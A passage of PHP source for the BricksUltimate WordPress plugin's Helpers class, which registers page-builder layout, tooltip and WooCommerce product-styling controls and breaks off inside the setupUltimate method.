<?php
namespace BricksUltimate;

if ( ! defined( 'ABSPATH' ) ) exit;

use BricksUltimate\{Plugin, UltimateQuery, Interactions, WooCommerce};
use BricksUltimate\Admin\License;

class Helpers {

	public static $free_shipping_class = false;

	public function __construct() {
		if ( License::has_valid_license() ) {
			$this->setupUltimate();

			if( class_exists( 'woocommerce' ) ) {
				new WooCommerce();
			}

			add_filter( 'bricks/setup/control_options', [$this, 'setup_control_options'] );
			add_filter( 'bricks/element/render_attributes', [ __CLASS__, 'bu_add_attributes' ], 1000, 3 );
			add_filter( 'aioseo_breadcrumbs_separator', [ $this, 'bu_allinone_separator' ] );

			//* Enqueue scripts
			add_action( 'wp_enqueue_scripts', [ $this, 'bu_wp_enqueue_scripts'], 9 );
		}
	}

	public function setup_control_options( $control_options ) {
		$control_options['flexWrap'] = [
			'nowrap'       => esc_html__( 'No wrap', 'bricks' ),
			'wrap'         => esc_html__( 'Wrap', 'bricks' ),
			'wrap-reverse' => esc_html__( 'Wrap reverse', 'bricks' ),
		];

		$template_types = $control_options['templateTypes'];
		$template_types['bu_as_result'] = 'BricksUltimate -' . esc_html__('Ajax search result', 'bricksultimate');

		$control_options['templateTypes'] = $template_types;

		return $control_options;
	}

	/**
	 * Checking builder is using or not
	 * 
	 * @return boolean
	 */
	public static function isBricksBuilderActive() {
		return ( isset( $_SERVER['HTTP_REFERER'] ) && strstr( $_SERVER['HTTP_REFERER'], 'brickspreview' ) );
	}

	/**
	 * Get the value of the elements
	 * 
	 * @return string/integer
	 */
	public static function get_value( $settings, $key, $default = false ) {
		return isset( $settings[ $key ] ) ? $settings[ $key ] : $default;
	}

	/**
	 * Get CSS path
	 * 
	 * @param string $key
	 * @return string
	 */
	public static function get_asset_url( $key ) {
		return Plugin::instance()->get_root_url() . "assets/{$key}/elements/";
	}

	/**
	 * Get JS path
	 * 
	 * @param string $key
	 * @return string
	 */
	public static function get_asset_path( $key ) {
		return Plugin::instance()->get_root_path() . "assets/{$key}/elements/";
	}

	/**
	 * Get all WP menus
	 * 
	 * @return array $options
	 */
	public static function getWPMenus() {
		$get_menus = wp_get_nav_menus();
		$options = [
			'none' 	=> __('Select a menu', "bricksultimate")
		];

		if ( $get_menus ) {
			foreach( $get_menus as $menu ) {
				$options[ $menu->slug ] = $menu->name;
			}
		} else {
			$options['nomenu'] = __('No menus found', "bricksultimate");
		}

		return $options;
	}

	public static function bu_layout_settings( $controls, $group, $selector, $return = false ) {
		// Display
		$controls['display'] = [
			'group' 	=> $group,
			'label'     => esc_html__( 'Display', 'bricks' ),
			'type'      => 'select',
			'options'   => [
				'flex'         => 'flex',
				'grid'         => 'grid',
				'block'        => 'block',
				'inline-block' => 'inline-block',
				'inline'       => 'inline',
				'none'         => 'none',
			],
			'add'       => true,
			'inline'    => true,
			'lowercase' => true,
			'css'       => [
				[
					'property' => 'display',
					'selector' => $selector
				],
				[
					'selector' => '',
					'property' => 'align-items',
					'value'    => 'initial',
					'required' => 'grid',
				],
			],
		];

		// Display: grid
		$controls['gridGap'] = [
			'group' 	=> $group,
			'label'       => esc_html__( 'Gap', 'bricks' ),
			'type'        => 'number',
			'units'       => true,
			'css'         => [
				[
					'property' => 'grid-gap',
					'selector' => $selector,
				],
			],
			'placeholder' => '',
			'required'    => [ 'display', '=', 'grid' ],
		];

		$controls['gridTemplateColumns'] = [
			'group' 		=> $group,
			'label'          => esc_html__( 'Grid template columns', 'bricks' ),
			'type'           => 'text',
			'tooltip'        => [
				'content'  => 'grid-template-columns',
				'position' => 'top-left',
			],
			'hasDynamicData' => false,
			'css'            => [
				[
					'property' => 'grid-template-columns',
					'selector' => $selector,
				],
			],
			'placeholder'    => '',
			'required'       => [ 'display', '=', 'grid' ],
		];

		$controls['gridTemplateRows'] = [
			'group' 		=> $group,
			'label'          => esc_html__( 'Grid template rows', 'bricks' ),
			'type'           => 'text',
			'tooltip'        => [
				'content'  => 'grid-template-rows',
				'position' => 'top-left',
			],
			'hasDynamicData' => false,
			'css'            => [
				[
					'property' => 'grid-template-rows',
					'selector' => $selector,
				],
			],
			'placeholder'    => '',
			'required'       => [ 'display', '=', 'grid' ],
		];

		$controls['gridAutoColumns'] = [
			'group' 		=> $group,
			'label'          => esc_html__( 'Grid auto columns', 'bricks' ),
			'type'           => 'text',
			'tooltip'        => [
				'content'  => 'grid-auto-columns',
				'position' => 'top-left',
			],
			'hasDynamicData' => false,
			'css'            => [
				[
					'property' => 'grid-auto-columns',
					'selector' => $selector,
				],
			],
			'required'       => [ 'display', '=', 'grid' ],
		];

		$controls['gridAutoRows'] = [
			'group' 		=> $group,
			'label'          => esc_html__( 'Grid auto rows', 'bricks' ),
			'type'           => 'text',
			'tooltip'        => [
				'content'  => 'grid-auto-rows',
				'position' => 'top-left',
			],
			'hasDynamicData' => false,
			'css'            => [
				[
					'property' => 'grid-auto-rows',
					'selector' => $selector,
				],
			],
			'required'       => [ 'display', '=', 'grid' ],
		];

		$controls['gridAutoFlow'] = [
			'group' 	=> $group,
			'label'    => esc_html__( 'Grid auto flow', 'bricks' ),
			'type'     => 'select',
			'options'  => [
				'row'    => 'row',
				'column' => 'column',
				'dense'  => 'dense',
			],
			'tooltip'  => [
				'content'  => 'grid-auto-flow',
				'position' => 'top-left',
			],
			'css'      => [
				[
					'property' => 'grid-auto-flow',
					'selector' => $selector,
				],
			],
			'required' => [ 'display', '=', 'grid' ],
		];

		$controls['justifyItemsGrid'] = [
			'group' 	=> $group,
			'label'     => esc_html__( 'Justify items', 'bricks' ),
			'tooltip'   => [
				'content'  => 'justify-items',
				'position' => 'top-left',
			],
			'type'      => 'justify-content',
			'direction' => 'row',
			'css'       => [
				[
					'property' => 'justify-items',
					'selector' => $selector,
				],
			],
			'required'  => [ 'display', '=', 'grid' ],
		];

		$controls['alignItemsGrid'] = [
			'group' 	=> $group,
			'label'     => esc_html__( 'Align items', 'bricks' ),
			'tooltip'   => [
				'content'  => 'align-items',
				'position' => 'top-left',
			],
			'type'      => 'align-items',
			'direction' => 'row',
			'css'       => [
				[
					'property' => 'align-items',
					'selector' => $selector,
				],
			],
			'required'  => [ 'display', '=', 'grid' ],
		];

		$controls['justifyContentGrid'] = [
			'group' 	=> $group,
			'label'     => esc_html__( 'Justify content', 'bricks' ),
			'tooltip'   => [
				'content'  => 'justify-content',
				'position' => 'top-left',
			],
			'type'      => 'justify-content',
			'direction' => 'row',
			'css'       => [
				[
					'property' => 'justify-content',
					'selector' => $selector,
				],
			],
			'required'  => [ 'display', '=', 'grid' ],
		];

		$controls['alignContentGrid'] = [
			'group' 	=> $group,
			'label'     => esc_html__( 'Align content', 'bricks' ),
			'tooltip'   => [
				'content'  => 'align-content',
				'position' => 'top-left',
			],
			'type'      => 'align-items',
			'direction' => 'row',
			'css'       => [
				[
					'property' => 'align-content',
					'selector' => $selector,
				],
			],
			'required'  => [ 'display', '=', 'grid' ],
		];

		// Display: flex

		// Flex controls
		$controls['flexWrap'] = [
			'group' 	=> $group,
			'label'    => esc_html__( 'Flex wrap', 'bricks' ),
			'tooltip'  => [
				'content'  => 'flex-wrap',
				'position' => 'top-left',
			],
			'type'     => 'select',
			'options'  => [
				'nowrap'       => esc_html__( 'No wrap', 'bricks' ),
				'wrap'         => esc_html__( 'Wrap', 'bricks' ),
				'wrap-reverse' => esc_html__( 'Wrap reverse', 'bricks' ),
			],
			'inline'   => true,
			'css'      => [
				[
					'property' => 'flex-wrap',
					'selector' => $selector,
				],
			],
			'required' => [ 'display', '=', 'flex' ],
		];

		$controls['direction'] = [
			'group' 	=> $group,
			'label'    => esc_html__( 'Direction', 'bricks' ),
			'tooltip'  => [
				'content'  => 'flex-direction',
				'position' => 'top-left',
			],
			'type'     => 'direction',
			'css'      => [
				[
					'property' => 'flex-direction',
					'selector' => $selector,
				],
			],
			'inline'   => true,
			'rerender' => true,
			'required' => [ 'display', '=', 'flex' ],
		];

		$controls['alignSelf'] = [
			'group' 	=> $group,
			'label'    => esc_html__( 'Align self', 'bricks' ),
			'tooltip'  => [
				'content'  => 'align-self',
				'position' => 'top-left',
			],
			'type'     => 'align-items',
			'css'      => [
				[
					'property'  => 'align-self',
					'selector' => $selector,
					'important' => true,
				],
				[
					'selector' => $selector,
					'property' => 'width',
					'value'    => '100%',
					'required' => 'stretch',
				],
			],
			'required' => [ 'display', '=', 'flex' ],
		];

		$controls['justifyContent'] = [
			'group' 	=> $group,
			'label'    => esc_html__( 'Align main axis', 'bricks' ),
			'tooltip'  => [
				'content'  => 'justify-content',
				'position' => 'top-left',
			],
			'type'     => 'justify-content',
			'css'      => [
				[
					'property' => 'justify-content',
					'selector' => $selector,
				],
			],
			'required' => [ 'display', '=', 'flex' ],
		];

		$controls['alignItems'] = [
			'group' 	=> $group,
			'label'    => esc_html__( 'Align cross axis', 'bricks' ),
			'tooltip'  => [
				'content'  => 'align-items',
				'position' => 'top-left',
			],
			'type'     => 'align-items',
			'css'      => [
				[
					'property' => 'align-items',
					'selector' => $selector,
				],
			],
			'required' => [ 'display', '=', 'flex' ],
		];

		$controls['columnGap'] = [
			'group' 	=> $group,
			'label'    => esc_html__( 'Column gap', 'bricks' ),
			'type'     => 'number',
			'units'    => true,
			'css'      => [
				[
					'property' => 'column-gap',
					'selector' => $selector,
				],
			],
			'required' => [ 'display', '=', 'flex' ],
		];

		$controls['rowGap'] = [
			'group' 	=> $group,
			'label'    => esc_html__( 'Row gap', 'bricks' ),
			'type'     => 'number',
			'units'    => true,
			'css'      => [
				[
					'property' => 'row-gap',
					'selector' => $selector,
				],
			],
			'required' => [ 'display', '=', 'flex' ],
		];

		// @since 1.3.5
		$controls['flexGrow'] = [
			'group' 	=> $group,
			'label'       => esc_html__( 'Flex grow', 'bricks' ),
			'type'        => 'number',
			'min'         => 0,
			'tooltip'     => [
				'content'  => 'flex-grow',
				'position' => 'top-left',
			],
			'css'         => [
				[
					'property' => 'flex-grow',
					'selector' => $selector,
				],
			],
			'placeholder' => 0,
			'required'    => [ 'display', '=', 'flex' ],
		];

		$controls['flexShrink'] = [
			'group' 	=> $group,
			'label'       => esc_html__( 'Flex shrink', 'bricks' ),
			'type'        => 'number',
			'min'         => 0,
			'tooltip'     => [
				'content'  => 'flex-shrink',
				'position' => 'top-left',
			],
			'css'         => [
				[
					'property' => 'flex-shrink',
					'selector' => $selector,
				],
			],
			'placeholder' => 1,
			'required'    => [ 'display', '=', 'flex' ],
		];

		$controls['flexBasis'] = [
			'group' 		=> $group,
			'label'          => esc_html__( 'Flex basis', 'bricks' ),
			'type'           => 'text',
			'tooltip'        => [
				'content'  => 'flex-basis',
				'position' => 'top-left',
			],
			'css'            => [
				[
					'property' => 'flex-basis',
					'selector' => $selector,
				],
			],
			'inline'         => true,
			'small'          => true,
			'placeholder'    => 'auto',
			'hasDynamicData' => false,
			'required'       => [ 'display', '=', 'flex' ],
		];

		if( $return )
			return $controls;
	}

	public static function bu_tooltip_controls( $controls, $group, $return = true ) {
		$controls['hasTooltip'] = [
			'group' 	=> $group,
			'label' 	=> esc_html__('Enable tooltip', 'bricksultimate'),
			'type' 		=> 'checkbox',
			'inline' 	=> true,
			'reset' 	=> true,
			'rerender' => false
		];

		$controls['ttBG'] = [
			'group' 	=> $group,
			'label' 	=> esc_html__('Background color', 'bricksultimate'),
			'type' 		=> 'color',
			'inline' 	=> true,
			'css' 	=> [
				[
					'property' => 'background-color', 
					'selector' => '.tippy-box'
				]
			],
			'required' 	=> ['hasTooltip', '=', true],
			'rerender' => false
		];

		$controls['ttAcolor'] = [
			'group' 	=> $group,
			'label' 	=> esc_html__('Arrow color', 'bricksultimate'),
			'type' 		=> 'color',
			'inline' 	=> true,
			'css' 	=> [
				[ 
					'property' => 'color', 
					'selector' => '.tippy-arrow'
				]
			],
			'required' 	=> ['hasTooltip', '=', true],
			'rerender' => false
		];

		$controls['ttTg'] = [
			'group' 	=> $group,
			'label' 	=> esc_html__('Typography', 'bricksultimate'),
			'type' 		=> 'typography',
			'inline' 	=> true,
			'css' 	=> [
				[
					'property' => 'font', 
					'selector' => '.tippy-content'
				]
			],
			'required' 	=> ['hasTooltip', '=', true],
			'rerender' => false
		];

		$controls['ttPlacement'] = [
			'group' 	=> $group,
			'label' 	=> esc_html__('Position', 'bricksultimate'),
			'type' 		=> 'select',
			'options' 	=> [
				'top' 			=> __( 'Top' ), 
				'top-start' 	=> __( 'Top Start' ), 
				'top-end' 		=> __( 'Top End' ),
				'right' 		=> __( 'Right' ), 
				'right-start' 	=> __( 'Right Start' ), 
				'right-end' 	=> __( 'Right End' ),
				'bottom' 		=> __( 'Bottom' ), 
				'bottom-start' 	=> __( 'Bottom Start' ), 
				'bottom-end' 	=> __( 'Bottom End' ),
				'left' 			=> __( 'Left' ), 
				'left-start' 	=> __( 'Left Start' ), 
				'left-end' 		=> __( 'Left End' ), 
				'auto' 			=> __( 'Auto' ), 
				'auto-start' 	=> __( 'Auto Start' ), 
				'auto-end' 		=> __( 'Auto End' ),
			],
			'inline' 		=> true,
			'placeholder' 	=> 'top',
			'required' 	=> ['hasTooltip', '=', true],
			'rerender' => false
		];

		$controls['ttAnimation'] = [
			'group' 	=> $group,
			'label' 	=> esc_html__('Animation', 'bricksultimate'),
			'type' 		=> 'select',
			'options' 	=> [
				'fade' 			=> __( 'Fade' ), 
				'shift-away' 	=> __( 'Shift Away' ), 
				'shift-toward' 	=> __( 'Shift Toward' ), 
				'perspective' 	=> __( 'Perspective' )
			],
			'inline' 		=> true,
			'placeholder' 	=> 'perspective',
			'required' 	=> ['hasTooltip', '=', true],
			'rerender' => false
		];

		if( $return )
			return $controls;
	}

	/**
	 * Enhance the product up/cross sells element's contorls
	 * 
	 * @param array $controls keeping the all controls properties
	 * @return array $controls returning the all controls properties
	 */
	public static function bu_product_common_controls( $controls ) {
		$controls['alignment'] = [
			'tab'      => 'content',
			'type'     => 'select',
			'label'    => esc_html__( 'Content alignment', 'bricksultimate' ),
			'options'  => [
				'left'  	=> esc_html__('Left'),
				'right' 	=> esc_html__('Right'),
				'center' 	=> esc_html__('Center')
			],
			'inline' => true,
			'css'      => [
				[
					'property'  => 'text-align',
					'selector' 	=> '.products .woocommerce-LoopProduct-link',
				]
			]
		];

		/**
		 * Product layout
		 */
		$controls['display'] = [
			'tab'         => 'content',
			'group'       => 'layout',
			'label'       => esc_html__( 'Display', 'bricks' ),
			'type'        => 'select',
			'options'     => [
				'flex'         => 'flex',
				'block'        => 'block',
				'inline-block' => 'inline-block',
				'inline'       => 'inline',
				'none'         => 'none',
			],
			'inline'      => true,
			'lowercase'   => true,
			'css'         => [
				[
					'property' => 'display',
					'selector' => '.products .product',
				],
			],
			'default' => 'flex',
		];

		$controls['flexWrap'] = [
			'tab'         => 'content',
			'group' => 'layout',
			'label'       => esc_html__( 'Flex wrap', 'bricks' ),
			'tooltip'     => [
				'content'  => 'flex-wrap',
				'position' => 'top-left',
			],
			'type'        => 'select',
			'options'     => \Bricks\Setup::get_control_options('flexWrap'),
			'inline'      => true,
			'css'         => [
				[
					'property' => 'flex-wrap',
					'selector' => '.products .product',
				],
			],
			'placeholder' => esc_html__( 'No wrap', 'bricks' ),
			'required'    => [ 'display', '=', [ '', 'flex' ] ],
		];

		$controls['direction'] = [
			'tab'      => 'content',
			'group'    => 'layout',
			'label'    => esc_html__( 'Direction', 'bricks' ),
			'tooltip'  => [
				'content'  => 'flex-direction',
				'position' => 'top-left',
			],
			'type'     => 'direction',
			'css'      => [
				[
					'property' => 'flex-direction',
					'selector' => '.products .product',
				],
			],
			'default'  => 'column',
			'inline'   => true,
			'rerender' => true,
			'required' => [ 'display', '=', [ '', 'flex' ] ],
		];


		/**
		 * Product Title
		 */
		$selector = '.woocommerce-loop-product__title';

		$controls['titleMargin'] = [
			'tab' 		=> 'content',
			'group' 	=> 'title',
			'type'      => version_compare( BRICKS_VERSION, '1.5', '>') ? 'spacing' : 'dimensions',
			'label'     => esc_html__( 'Margin', 'bricks' ),
			'css'   	=> [
				[
					'property' => 'margin',
					'selector' => $selector
				],
			],
		];

		$controls['titleTypography'] = [
			'tab'      => 'content',
			'group'    => 'title',
			'type'     => 'typography',
			'label'    => esc_html__( 'Typography', 'bricks' ),
			'css'      => [
				[
					'property'  => 'font',
					'selector' 	=> $selector
				]
			]
		];

		$controls['titleHoverColor'] = [
			'tab'      => 'content',
			'group'    => 'title',
			'type'     => 'color',
			'label'    => esc_html__( 'Hover color', 'bricksultimate' ),
			'css'      => [
				[
					'property'  => 'color',
					'selector' 	=> $selector . ':hover',
				]
			]
		];

		/**
		 * Price
		 */
		$controls['hideRegularPrice'] = [
			'tab'   => 'content',
			'group' => 'price',
			'label' => esc_html__( 'Hide strick through price', 'bricks' ),
			'type'  => 'checkbox',
			'css'   => [
				[
					'selector' => 'del',
					'property' => 'display',
					'value'    => 'none',
				],
			]
		];

		$controls['productPrice'] = [
			'tab'   => 'content',
			'group' => 'price',
			'label' => esc_html__( 'Price', 'bricks' ),
			'type'  => 'typography',
			'css'   => [
				[
					'selector' => '.price .amount',
					'property' => 'font',
				]
			]
		];

		$controls['regularPrice'] = [
			'tab'   => 'content',
			'group' => 'price',
			'label' => esc_html__( 'Strick through price', 'bricks' ),
			'type'  => 'typography',
			'css'   => [
				[
					'selector' 	=> 'del',
					'property' 	=> 'font'
				],
				[
					'selector' => '.price del .amount',
					'property' => 'font',
				],
			]
		];


		//* add to cart button
		$selector = ".button";

		$controls['buttonBoxShadow'] = [
			'tab'   => 'content',
			'group' => 'button',
			'label' => esc_html__( 'Box shadow', 'bricks' ),
			'type'  => 'box-shadow',
			'css'   => [
				[
					'property' => 'box-shadow',
					'selector' => $selector,
				],
			],
		];

		$controls['buttonWidth'] = [
			'tab' 		=> 'content',
			'group' 	=> 'button',
			'type'      => 'number',
			'label'     => esc_html__( 'Width', 'bricks' ),
			'units' 	=> true,
			'min' 		=> 0,
			'max' 		=> 1000,
			'step' 		=> 1,
			'inline' 	=> true,
			'medium' 	=> true,
			'placeholder' => '100%',
			'css'   	=> [
				[
					'property' => 'width',
					'selector' => $selector,
				]
			],
		];

		$controls['buttonHeight'] = [
			'tab' 		=> 'content',
			'group' 	=> 'button',
			'type'      => 'number',
			'label'     => esc_html__( 'Height', 'bricks' ),
			'units' 	=> true,
			'min' 		=> 0,
			'max' 		=> 1000,
			'step' 		=> 1,
			'inline' 	=> true,
			'medium' 	=> true,
			'placeholder' => '40px',
			'css'   	=> [
				[
					'property' => 'height',
					'selector' => $selector,
				]
			],
		];

		unset( $controls['buttonPadding'] );

		$controls['buttonMargin'] = [
			'tab' 		=> 'content',
			'group' 	=> 'button',
			'type'      => version_compare( BRICKS_VERSION, '1.5', '>') ? 'spacing' : 'dimensions',
			'label'     => esc_html__( 'Margin', 'bricks' ),
			'css'   	=> [
				[
					'property' => 'margin',
					'selector' => $selector,
				],
			],
		];

		$controls['buttonPadding'] = [
			'tab'   => 'content',
			'group' => 'button',
			'label' => esc_html__( 'Padding', 'bricks' ),
			'type'  => version_compare( BRICKS_VERSION, '1.5', '>') ? 'spacing' : 'dimensions',
			'css'   => [
				[
					'selector' => '.button',
					'property' => 'padding',
				],
			],
		];

		$controls['atcBtnHover'] = [
			'tab' 		=> 'content',
			'group' 	=> 'button',
			'type'      => 'separator',
			'label'     => esc_html__('Hover', 'bricksultimate'),
		];

		$controls['atcBtnHoverBackgroundColor'] = [
			'tab'   => 'content',
			'group' => 'button',
			'label' => esc_html__( 'Background', 'bricks' ),
			'type'  => 'color',
			'css'   => [
				[
					'property' => 'background-color',
					'selector' => $selector . ':hover',
					'important' => true
				],
			],
		];

		$controls['atcBtnHoverColor'] = [
			'tab'   => 'content',
			'group' => 'button',
			'label' => esc_html__( 'Color', 'bricks' ),
			'type'  => 'color',
			'css'   => [
				[
					'property' => 'color',
					'selector' => $selector . ':hover',
					'important' => true
				],
			],
		];

		$controls['atcBtnHoverBorder'] = [
			'tab'   => 'content',
			'group' => 'button',
			'label' => esc_html__( 'Border', 'bricks' ),
			'type'  => 'border',
			'css'   => [
				[
					'property' => 'border',
					'selector' => $selector . ':hover',
					'important' => true
				],
			],
		];

		$controls['atcBtnHoverBoxShadow'] = [
			'tab'   => 'content',
			'group' => 'button',
			'label' => esc_html__( 'Box shadow', 'bricks' ),
			'type'  => 'box-shadow',
			'css'   => [
				[
					'property' => 'box-shadow',
					'selector' => $selector . ':hover',
					'important' => true
				],
			],
		];


		/**
		 * Sale badge
		 */
		$selector = '.badge.onsale';

		$controls['saleBadgeWidth'] = [
			'tab' 		=> 'content',
			'group' 	=> 'saleBadge',
			'type'      => 'number',
			'label'     => esc_html__( 'Width', 'bricks' ),
			'units' 	=> true,
			'min' 		=> 0,
			'max' 		=> 1000,
			'step' 		=> 1,
			'inline' 	=> true,
			'medium' 	=> true,
			'placeholder' => '100%',
			'css'   	=> [
				[
					'property' => 'width',
					'selector' => $selector,
				]
			],
		];

		$controls['saleBadgeHeight'] = [
			'tab' 		=> 'content',
			'group' 	=> 'saleBadge',
			'type'      => 'number',
			'label'     => esc_html__( 'Height', 'bricks' ),
			'units' 	=> true,
			'min' 		=> 0,
			'max' 		=> 1000,
			'step' 		=> 1,
			'inline' 	=> true,
			'medium' 	=> true,
			'placeholder' => '40px',
			'css'   	=> [
				[
					'property' => 'Height',
					'selector' => $selector,
				],
				[
					'property' => 'line-height',
					'selector' => $selector,
				]
			],
		];

		$controls['saleBadgeBackgroundColor'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'label' => esc_html__( 'Background', 'bricks' ),
			'type'  => 'color',
			'css'   => [
				[
					'property' => 'background-color',
					'selector' => $selector
				],
			],
		];

		$controls['saleBadgeTypography'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'label' => esc_html__( 'Typography', 'bricks' ),
			'type'  => 'typography',
			'css'   => [
				[
					'property' => 'font',
					'selector' => $selector
				],
			],
		];

		$controls['saleBadgeBorder'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'label' => esc_html__( 'Border', 'bricks' ),
			'type'  => 'border',
			'css'   => [
				[
					'property' => 'border',
					'selector' => $selector
				],
			],
		];

		$controls['saleBadgeBoxshadow'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'label' => esc_html__( 'Box shadow', 'bricks' ),
			'type'  => 'box-shadow',
			'css'   => [
				[
					'property' => 'box-shadow',
					'selector' => $selector
				],
			],
		];

		$controls['saleBadgeSpacing'] = [
			'tab' 		=> 'content',
			'group' 	=> 'saleBadge',
			'type'      => 'separator',
			'label'     => esc_html__( 'Sapcing', 'bricks' ),
		];

		$controls['_sbMrginInfo'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'type'  => 'info',
			'content' => esc_html__('Set margin-top: 0, if you want to move the sale badge to the right side.', 'bricksultimate')
		];

		$controls['saleBadgeMargin'] = [
			'tab' 		=> 'content',
			'group' 	=> 'saleBadge',
			'type'      => version_compare( BRICKS_VERSION, '1.5', '>') ? 'spacing' : 'dimensions',
			'label'     => esc_html__( 'Margin', 'bricks' ),
			'default' 	=> [
				'top' 	=> 32
			],
			'css'   	=> [
				[
					'property' => 'margin',
					'selector' => '.badge+.badge'
				],
			],
		];

		$controls['saleBadgePadding'] = [
			'tab' 		=> 'content',
			'group' 	=> 'saleBadge',
			'type'      => version_compare( BRICKS_VERSION, '1.5', '>') ? 'spacing' : 'dimensions',
			'label'     => esc_html__( 'Padding', 'bricks' ),
			'css'   	=> [
				[
					'property' => 'padding',
					'selector' => $selector,
				],
			],
		];

		$controls['saleBadgeSepPos'] = [
			'tab' 		=> 'content',
			'group' 	=> 'saleBadge',
			'type'      => 'separator',
			'label'     => esc_html__( 'Positioning', 'bricks' ),
		];

		$controls['_sbTop'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'label' => esc_html__( 'Top', 'bricks' ),
			'type'  => 'number',
			'units' => true,
			'css'   => [
				[
					'property' => 'top',
					'selector' => $selector,
				],
			],
		];

		$controls['_sbRight'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'label' => esc_html__( 'Right', 'bricks' ),
			'type'  => 'number',
			'units' => true,
			'css'   => [
				[
					'property' => 'right',
					'selector' => $selector,
				],
			],
		];

		$controls['_sbBottom'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'label' => esc_html__( 'Bottom', 'bricks' ),
			'type'  => 'number',
			'units' => true,
			'css'   => [
				[
					'property' => 'bottom',
					'selector' => $selector,
				],
			],
		];

		$controls['_sbLeft'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'label' => esc_html__( 'Left', 'bricks' ),
			'type'  => 'number',
			'units' => true,
			'css'   => [
				[
					'property' => 'left',
					'selector' => $selector,
				],
			],
		];

		$controls['_sbLeftInfo'] = [
			'tab'   => 'content',
			'group' => 'saleBadge',
			'type'  => 'info',
			'content' => esc_html__('Set left value is auto, if you want to move the new badge to the right side.', 'bricksultimate')
		];

		$controls['_sbzIndex'] = [
			'tab'         => 'content',
			'group'       => 'saleBadge',
			'label'       => esc_html__( 'Z-index', 'bricks' ),
			'type'        => 'number',
			'css'         => [
				[
					'property' => 'z-index',
					'selector' => $selector,
				],
			],
			'min'         => -999,
			'placeholder' => 0,
		];


		/**
		 * New badge button
		 */
		$selector = '.badge.new';

		$controls['newBadgeWidth'] = [
			'tab' 		=> 'content',
			'group' 	=> 'newBadge',
			'type'      => 'number',
			'label'     => esc_html__( 'Width', 'bricks' ),
			'units' 	=> true,
			'min' 		=> 0,
			'max' 		=> 1000,
			'step' 		=> 1,
			'inline' 	=> true,
			'medium' 	=> true,
			'placeholder' => '100%',
			'css'   	=> [
				[
					'property' => 'width',
					'selector' => $selector,
				]
			],
		];

		$controls['newBadgeHeight'] = [
			'tab' 		=> 'content',
			'group' 	=> 'newBadge',
			'type'      => 'number',
			'label'     => esc_html__( 'Height', 'bricks' ),
			'units' 	=> true,
			'min' 		=> 0,
			'max' 		=> 1000,
			'step' 		=> 1,
			'inline' 	=> true,
			'medium' 	=> true,
			'placeholder' => '40px',
			'css'   	=> [
				[
					'property' => 'Height',
					'selector' => $selector,
				],
				[
					'property' => 'line-height',
					'selector' => $selector,
				]
			],
		];

		$controls['newBadgeBackgroundColor'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'label' => esc_html__( 'Background', 'bricks' ),
			'type'  => 'color',
			'css'   => [
				[
					'property' => 'background-color',
					'selector' => $selector
				],
			],
		];

		$controls['newBadgeTypography'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'label' => esc_html__( 'Typography', 'bricks' ),
			'type'  => 'typography',
			'css'   => [
				[
					'property' => 'font',
					'selector' => $selector
				],
			],
		];

		$controls['newBadgeBorder'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'label' => esc_html__( 'Border', 'bricks' ),
			'type'  => 'border',
			'css'   => [
				[
					'property' => 'border',
					'selector' => $selector
				],
			],
		];

		$controls['newBadgeBoxshadow'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'label' => esc_html__( 'Box shadow', 'bricks' ),
			'type'  => 'box-shadow',
			'css'   => [
				[
					'property' => 'box-shadow',
					'selector' => $selector
				],
			],
		];
 
		$controls['newBadgeSepPos'] = [
			'tab' 		=> 'content',
			'group' 	=> 'newBadge',
			'type'      => 'separator',
			'label'     => esc_html__( 'Positioning', 'bricks' ),
		];

		$controls['_nbTop'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'label' => esc_html__( 'Top', 'bricks' ),
			'type'  => 'number',
			'units' => true,
			'css'   => [
				[
					'property' => 'top',
					'selector' => $selector,
				],
			],
		];

		$controls['_nbRight'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'label' => esc_html__( 'Right', 'bricks' ),
			'type'  => 'number',
			'units' => true,
			'css'   => [
				[
					'property' => 'right',
					'selector' => $selector,
				],
			],
		];

		$controls['_nbBottom'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'label' => esc_html__( 'Bottom', 'bricks' ),
			'type'  => 'number',
			'units' => true,
			'css'   => [
				[
					'property' => 'bottom',
					'selector' => $selector,
				],
			],
		];

		$controls['_nbLeft'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'label' => esc_html__( 'Left', 'bricks' ),
			'type'  => 'number',
			'units' => true,
			'css'   => [
				[
					'property' => 'left',
					'selector' => $selector,
				],
			],
		];

		$controls['_nbLeftInfo'] = [
			'tab'   => 'content',
			'group' => 'newBadge',
			'type'  => 'info',
			'content' => esc_html__('Set left value is auto, if you want to move the new badge to the right side.', 'bricksultimate')
		];

		$controls['_nbzIndex'] = [
			'tab'         => 'content',
			'group'       => 'newBadge',
			'label'       => esc_html__( 'Z-index', 'bricks' ),
			'type'        => 'number',
			'css'         => [
				[
					'property' => 'z-index',
					'selector' => $selector,
				],
			],
			'min'         => -999,
			'placeholder' => 0,
		];

		return $controls;
	}

	public function filter_heading_element_controls( $controls ) {

		$controls['tag']['options']['custom'] = esc_html__('Custom');

		$inserted['customTag'] = [
			'tab'            => 'content',
			'label'          => esc_html__( 'Custom tag', 'bricks' ),
			'type'           => 'text',
			'inline'         => true,
			'placeholder'    => 'h3',
			'required'       => [ 'tag', '=', 'custom' ],
		];

		$pos   = array_search( 'type', array_keys( $controls ) );
		$controls = array_merge(
			array_slice($controls, 0, $pos),
			$inserted,
			array_slice($controls, $pos)
		);

		return $controls;
	}

	private function setupUltimate() {
		//* setup inbuilt element's controls
		$buSettings = Plugin::$bu_settings;

		if( ! empty( $buSettings['admin_bar'] ) && $buSettings['admin_bar'] == 'enabled' ) {
			$this->showAdminBarInEditor();
		}

		if( class_exists('WooCommerce') ) {
			if( ! empty( $buSettings['product_atc'] ) && $buSettings['product_atc'] == 'enabled' ) {
